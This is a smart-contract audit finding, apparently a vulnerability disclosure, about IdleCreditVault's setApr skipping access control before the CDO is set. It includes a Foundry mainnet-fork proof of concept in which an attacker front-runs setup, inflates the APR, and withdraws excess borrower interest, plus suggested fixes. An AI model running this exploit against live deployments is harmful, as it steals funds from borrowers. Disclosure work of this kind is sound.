### Title
Uninitialized `idleCDO` lets any attacker overwrite the credit-vault APR before CDO wiring - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr()` skips caller authentication whenever `idleCDO == address(0)`, allowing any unprivileged account to replace both `unscaledApr` and the scaled `lastApr` through `setAprs()` between strategy initialization and `setWhitelistedCDO()`. [1](#0-0)  The injected scaled APR is then used to calculate and pull epoch interest, creating an unauthorized borrower payment that benefits the attacker’s LP position. [2](#0-1) [3](#0-2) 

### Finding Description
The intended access model permits only the configured CDO or manager to change the APR. [4](#0-3)  However, during initialization `idleCDO` is still unset, and `setApr()` treats that state as setup mode and skips the sender check entirely. [5](#0-4) 

An attacker can therefore front-run the owner’s `setWhitelistedCDO()` transaction and call `setAprs(17.142857142857142857e18, 20e18)`. The second value is the maximum permitted scaled APR, while the first value becomes the externally reported unscaled APR. [1](#0-0) 

At `startEpoch()`, the poisoned scaled APR determines `expectedEpochInterest`. [2](#0-1)  At `stopEpoch()`, the CDO pulls that amount from the borrower and credits it to tranche NAV. [6](#0-5)  If the attacker is the sole depositor, the excess borrower payment becomes withdrawable LP NAV rather than merely an accounting aberration.

### Impact Explanation
This is direct theft from the honest borrower through unauthorized APR inflation.

For a 1,000,000 USDC pool and a 30-day epoch:

- Intended configured APR: `10e18`
- Intended scaled APR: `10e18 * 35 / 30 = 11.666666e18`
- Intended epoch interest: approximately `9,589.04 USDC`
- Attacker scaled APR: `20e18`
- Attacker-controlled epoch interest: approximately `16,438.36 USDC`
- Excess withdrawn from the borrower: approximately `6,849.32 USDC` per epoch and per 1,000,000 USDC of TVL

The excess is bounded by `maxApr`, which defaults to `20e18`, but can be as high as the configured cap. [7](#0-6) [8](#0-7) 

### Likelihood Explanation
The attack requires a deployment sequence in which strategy initialization/CDO initialization and `setWhitelistedCDO()` occur in separate transactions. Manual deployment scripts exhibit this sequence by whitelisting the CDO after strategy and CDO deployment. [9](#0-8)  The factory path performs configuration atomically, which reduces exposure for factory-created vaults, but it does not fix the vulnerable uninitialized access-control state in the deployed strategy itself. [10](#0-9) 

No malicious privileged role is required: the attacker is any EOA that observes the strategy before `idleCDO` is set.

### Recommendation
Do not bypass authorization when `idleCDO == address(0)`. Instead:

- Restrict APR changes during setup to `owner()` or `manager`.
- Require the CDO in the initializer or provide an owner-only `initializeCDO()` function that atomically sets `idleCDO` and the initial scaled APR.
- Alternatively, make `setWhitelistedCDO()` set the configured APR in the same transaction that activates CDO authorization.
- Reject APR mutations after initialization unless `idleCDO != address(0)` and the sender is the CDO or manager.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract AprInitializationRacePoC is Test {
    using stdStorage for StdStorage;

    address internal constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant DEPOSIT = 1_000_000e6;
    uint256 internal constant INTENDED_APR = 10e18;
    uint256 internal constant ATTACKER_UNSCALED_APR =
        17.142857142857142857e18;
    uint256 internal constant ATTACKER_SCALED_APR = 20e18;

    IdleCreditVault internal strategy;
    IdleCDOEpochVariant internal cdo;
    IERC20Detailed internal usdc = IERC20Detailed(USDC);

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal attacker = makeAddr("attacker");
    address internal feeReceiver = makeAddr("feeReceiver");

    function test_UninitializedCdoLetsAttackerSetApr() public {
        vm.createSelectFork("mainnet");

        strategy = new IdleCreditVault();
        stdstore
            .target(address(strategy))
            .sig(strategy.token.selector)
            .checked_write(address(0));
        strategy.initialize(
            USDC,
            owner,
            manager,
            borrower,
            "Borrower",
            INTENDED_APR
        );

        cdo = new IdleCDOEpochVariant();
        stdstore
            .target(address(cdo))
            .sig(cdo.token.selector)
            .checked_write(address(0));
        cdo.initialize(
            0,
            USDC,
            feeReceiver,
            owner,
            address(0),
            address(strategy),
            100_000
        );

        // idleCDO is still unset, so no CDO/manager sender check applies.
        assertEq(strategy.idleCDO(), address(0));
        vm.prank(attacker);
        strategy.setAprs(
            ATTACKER_UNSCALED_APR,
            ATTACKER_SCALED_APR
        );
        assertEq(strategy.getApr(), ATTACKER_SCALED_APR);

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        vm.prank(owner);
        cdo.setFeeParams(feeReceiver, 0, 100_000, 0);
        vm.prank(owner);
        cdo.setIsAYSActive(false);

        deal(USDC, attacker, DEPOSIT);
        vm.startPrank(attacker);
        usdc.approve(address(cdo), type(uint256).max);
        cdo.depositAA(DEPOSIT);
        vm.stopPrank();

        deal(USDC, borrower, DEPOSIT * 2);
        vm.prank(borrower);
        usdc.approve(address(cdo), type(uint256).max);

        vm.prank(owner);
        cdo.startEpoch();

        uint256 inflatedInterest = cdo.expectedEpochInterest();
        uint256 intendedScaledApr =
            INTENDED_APR *
            (cdo.epochDuration() + cdo.bufferPeriod()) /
            cdo.epochDuration();
        uint256 intendedInterest =
            DEPOSIT *
            (intendedScaledApr / 100) *
            cdo.epochDuration() /
            (365 days * 1e18);

        assertGt(inflatedInterest, intendedInterest);
        uint256 stolenInterest = inflatedInterest - intendedInterest;
        assertApproxEqAbs(stolenInterest, 6_849.315068e6, 1e6);

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        vm.prank(attacker);
        cdo.requestWithdraw(0, cdo.AATranche());

        vm.warp(block.timestamp + cdo.bufferPeriod() + 1);
        vm.prank(owner);
        cdo.startEpoch();

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        uint256 beforeClaim = usdc.balanceOf(attacker);
        vm.prank(attacker);
        cdo.claimWithdrawRequest();

        assertEq(
            usdc.balanceOf(attacker) - beforeClaim,
            DEPOSIT + inflatedInterest
        );
    }
}

  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
